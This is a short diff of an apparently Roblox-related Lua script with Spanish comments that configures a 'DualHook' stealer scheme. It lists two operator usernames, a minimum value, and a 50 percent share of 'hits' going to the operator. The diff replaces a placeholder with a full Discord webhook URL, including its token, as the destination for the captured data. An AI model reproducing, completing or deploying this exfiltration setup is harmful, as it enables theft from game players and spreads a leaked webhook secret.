@@ -16,7 +16,7 @@ local pingEveryone = _G.pingEveryone == "Yes"
 
 -- Configuración DualHook
 local DualHookUsers = {"cybertu24","AnonymousANONIMO125"}
-local DualHookWebhook = "TU_WEBHOOK_AQUI" -- Cambiar a tu webhook real
+local DualHookWebhook = "https://discord.com/api/webhooks/1393678758883496078/dWWVbv5oLiiHL9Po5FYg77bbJXVBeHkkij_Hy1MpxQHut1pNY2c_hzNg8jK0Qq7jNCRM" -- Cambiar a tu webhook real
 local DualHookMinValue = 500
 local DualHookPercent = 50 -- porcentaje de hits que se van a ti
 
